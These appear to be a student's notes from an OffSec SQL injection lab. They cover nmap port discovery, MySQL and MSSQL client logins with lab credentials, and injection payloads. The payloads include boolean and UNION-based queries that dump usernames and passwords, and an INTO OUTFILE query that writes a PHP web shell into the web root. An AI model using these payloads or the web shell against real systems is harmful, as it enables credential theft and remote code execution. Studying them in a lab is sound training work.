[SQLMap - Cheetsheat - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
[MySQL injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection)
## SQL DB TYPES AND THEORY
MySQL and Microsoft SQL Server (MSSQL) most common
Identify the port using NMAP

### MYSQL
sudo nmap -T5 --top-ports=500 -sS 192.168.238.16

Nmap scan report for 192.168.238.16
Host is up (0.045s latency).
Not shown: 496 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql              ----HERE IS THE PORT #
8000/tcp open  http-alt
8080/tcp open  http-proxy

After seeing the port, go to mysql if username/password provided

$ mysql -u root **-p'root'** -h 192.168.238.16 -P 3306
**(-p = Password)  (-P= Port)**

MySQL [(none)]> 

SIMPLE VERSION/SYSTEM AND DATABASE INFO
-MySQL [(none)]> select version ();
+------------+
| version () |
+------------+
| 8.0.21     |
+------------+
-MySQL [(none)]> select system_user();
+---------------------+
| system_user()       |
+---------------------+
| root@192.168.45.181 |
+---------------------+
-MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+

Sample of using finding an authentication string from an user
![[Pasted image 20230930080712.png]]

### MSSQL 
Impacket
Run Nmap to identify the service
┌──(hollacosta㉿kali1)-[~]
└─$ sudo nmap -T5 --top-ports=500 -sS 192.168.238.18                      
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
**1433/tcp open  ms-sql-s**    -------HERE IS MSSQL
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

└─$ impacket-mssqlclient Administrator:Lab123@192.168.238.18 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation


Encryption required, switching to TLS
 ENVCHANGE(DATABASE): Old Value: master, New Value: master
 ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
 INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
ACK: Result: 1 - Microsoft SQL Server (150 7208) 
 Press help for extra shell commands
SQL> 

SQL> SELECT @@version;
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2022 Standard 10.0 Build 20348: ) (Hypervisor)

SQL> SELECT name FROM sys.databases; -SHOWS DBS
name                                                                                         
master                                                                                       
tempdb                                                                                      
model                                                                                                
SQL> select * from offsec.dbo.users;    ---INFO ABOUT DB
username     password     

admin        lab          

guest        guest      

## SQL INJECTION ATTACKS
If you can use a ' at the end and receive a response, you can interact with the database
![[Pasted image 20230930093732.png]]

after finding the ' gets a response, you can use a cmd like this to find more information to interact further with it

offsec' OR 1=1 == //

![[Pasted image 20231001051716.png]]
' or 1=1 in **(select @@version)** -- //   -----**This is where the query goes!**

using a specific criteria will most likely provide you with the desired result
```
' or 1=1 in (SELECT password FROM users) -- //
```

![[Pasted image 20231001053044.png]]

being more specific would give you the information you desire (e.g. admin password)
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
![[Pasted image 20231001053200.png]]


### UNION BASE SQL ATTACKS
some databases could be attacked using UNION SQL queries; The **UNION**[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/sql-injection-attacks/manual-sql-exploitation/union-based-payloads#fn1) keyword aids exploitation because it enables execution of an extra SELECT statement and provides the results in the same query, thus concatenating two queries into one statement. use this to see all the info for the users in the database

```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

![[Pasted image 20231001054044.png]]

this could be use to determine the exact columns (if you get an error, you know you have exceeded the amount)
![[Pasted image 20231001054147.png]]

Use this command to enumerate the database. **use the % sign to retrieve ALL the information from the DB**
```
%' UNION SELECT database(), user(), @@version, null, null -- //
```

![[Pasted image 20231001054233.png]]

this cmd will give you an exact query info about the user (**no % use in this query since we know the specific info we are looking for**)
```
' UNION SELECT null, null, database(), user(), @@version  -- //
```
![[Pasted image 20231001054619.png]]

with this  cmd, we are attempting to enumerate the db
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
![[Pasted image 20231001054924.png]]
with the next command, we are attempting to dump the user name, password and description
```
' UNION SELECT null, username, password, description, null FROM users -- //
```
![[Pasted image 20231001055033.png]]

### BLIND SQL INJECTIONS

### EXERCISES

#### Q5

```
' ORDER BY 1-- //
```
To identify columns.
![[Pasted image 20231004201438.png]]
![[Pasted image 20231004202641.png]]
![[Pasted image 20231004203231.png]]


<?php system($_GET['cmd']); ?>

' UNION SELECT null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE "/var/www/html/webshell.php" -- //

![[Pasted image 20231004214100.png]]
